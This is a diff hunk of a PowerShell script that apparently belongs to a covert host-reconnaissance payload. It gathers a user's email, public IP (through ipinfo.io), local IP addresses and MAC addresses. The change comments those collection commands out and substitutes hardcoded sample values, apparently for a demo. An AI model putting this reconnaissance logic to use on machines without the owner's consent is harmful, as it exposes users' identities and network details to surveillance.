@@ -42,18 +42,34 @@ function Get-email {
     }        
 }
 
-$email = Get-email
-
+#$email = Get-email
+$email = "iamjakoby@example.com"
 #------------------------------------------------------------------------------------------------------------------------------------
 
 
-try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
-catch{$computerPubIP="Error getting Public IP"}
+#try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
+#catch{$computerPubIP="Error getting Public IP"}
 
-$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
+$computerPubIP="74.36.101.154"
 
-$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String
+#$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
 
+$localIP = @"
+InterfaceAlias IPAddress      PrefixOrigin
+-------------- ---------      ------------
+Ethernet 2     162.254.121.60    WellKnown
+Ethernet       192.165.254.16         Dhcp
+Wi-Fi          169.254.1.58      WellKnown
+"@
+
+#$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String
+$MAC = @"
+Name       MacAddress        Status      
+----       ----------        ------      
+Ethernet 2 A4-E0-62-D0-38-D6 Disconnected
+Ethernet   CE-80-B7-66-A4-CF Up          
+Wi-Fi      D0-97-B0-8A-23-19 Disconnected
+"@
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
